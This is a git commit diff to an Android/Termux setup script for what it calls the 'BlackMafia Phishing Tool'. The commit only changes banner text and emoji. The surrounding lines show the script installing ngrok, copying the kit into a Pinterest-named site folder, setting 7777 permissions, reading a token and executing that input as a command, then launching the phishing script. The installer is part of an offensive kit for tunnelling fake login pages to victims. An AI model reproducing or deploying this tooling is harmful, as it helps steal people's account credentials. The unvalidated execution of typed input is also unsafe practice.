6f0ed0a16d61b53ed06ef2e98b306115ed93450d
lovehacker <61407838+lovehacker404@users.noreply.github.com>
2020-12-03 15:31:45 +0500

    Update Android-Setup.sh

--- Android-Setup.sh
+++ Android-Setup.sh
@@ -5,13 +5,13 @@ echo ""
 echo ""
 echo ""
 echo ""
-echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! Ngrok Installation Plz Wi8 !!! \e[0m'
+echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m⛔ Ngrok  Installation  ⛔ \e[0m'
 sleep 3
 clear
 echo ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  ⛔         DOWNLOAD REQUIREMENTS         ⛔\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 termux-setup-storage
@@ -66,17 +66,17 @@ cp -R ngrok BlackMafiaLovehacker Sites/pinterest/
 chmod 7777 BlackMafia.sh
 clear
 echo ""
-echo -e $'\e[1;91m[\e[0m\e[1;33m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m 01⛔  https://ngrok.com  ⛔\e[0m'
-echo -e $'\e[1;91m[\e[0m\e[1;35m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m 02⛔ Login Ngrok WebSite ⛔\e[0m'
-echo -e $'\e[1;91m[\e[0m\e[1;32m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m 93⛔   Copy Ngrok Token  ⛔\e[0m'
+echo -e $'\e[1;91m[\e[0m\e[1;33m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m  https://ngrok.com   ⛔\e[0m'
+echo -e $'\e[1;91m[\e[0m\e[1;35m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m  Login Ngrok WebSite ⛔\e[0m'
+echo -e $'\e[1;91m[\e[0m\e[1;32m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m  Copy Ngrok Token    ⛔\e[0m'
 echo ""
-read -p $'\e[1;91m[\e[0m\e[1;71m ⛔ \e[0m\e[1;91m]\e[0m\e[1;95m Enter Token ➡️ : \e[0m' token
+read -p $'\e[1;91m[\e[0m\e[1;71m ⛔ \e[0m\e[1;91m]\e[0m\e[1;95m  Enter Token ➡️ : \e[0m' token
 $token
 sleep2
 clear
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;95m   -------------------------------------- \e[1;91m\e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!       Installation Successfull       !!  \e[1;91m\e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !! WellCome To BlackMafia Phishing Tool !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m ⛔       Installation Successfull       ⛔  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m ⛔ WellCome To BlackMafia Phishing Tool ⛔  \e[1;91m\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;95m   -------------------------------------- \e[1;91m\e[0m'
 sleep 4
 ./BlackMafia.sh
